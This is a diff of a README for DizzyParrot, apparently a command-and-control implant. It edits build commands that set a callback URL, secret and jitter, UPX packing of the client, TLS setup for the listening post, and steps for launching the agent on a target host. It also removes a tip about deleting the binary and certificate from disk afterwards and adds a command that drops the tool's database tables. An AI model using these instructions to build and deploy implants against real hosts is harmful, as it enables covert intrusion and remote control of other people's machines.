@@ -77,7 +77,7 @@ make build_arm NAME=A10002
 make build_ppc NAME=A10002 URL=https://localhost:8443/portal/status SECRET=dizzyparrot CALLBACK=300 JITTER=60
 ```
 
-#### Build manually. Clone the repo using git and go get dependencies
+#### Build manually. Clone the repo using git and go get dependencies.
 ```
 # Clone repo
 git clone https://github.com/af001/DizzyParrot.git
@@ -111,7 +111,8 @@ upx --brute client
 
 #### Start the LP
 ```
-# Make sure to set the common name as 'localhost'. If you don't, you may recieve a TLS Handshake error on the LP
+# Make sure to set the common name as 'localhost'. If you don't, you may recieve a TLS Handshake error on the LP.
+
 cd server; mkdir cert
 openssl genrsa -out cert/server.key 4096
 openssl req -new -x509 -sha256 -days 1825 -key cert/server.key -out 
@@ -150,8 +151,6 @@ screen -x DIZZY_SHELL
 
 #### Execute agent on target host
 
-If not using real certs, the client requieres the server certificate upon execution. After execution, the binary and certificate can be removed from disk. 
-
 ```
 # Start agent
 ./client -c server.crt &
@@ -167,6 +166,10 @@ sudo -u postgres psql
 
 # View tables
 \dt
+
+# Drop old tables
+DROP TABLE agents,results,tasks,tokens;
+
 ```
 #### Basic Usage
 
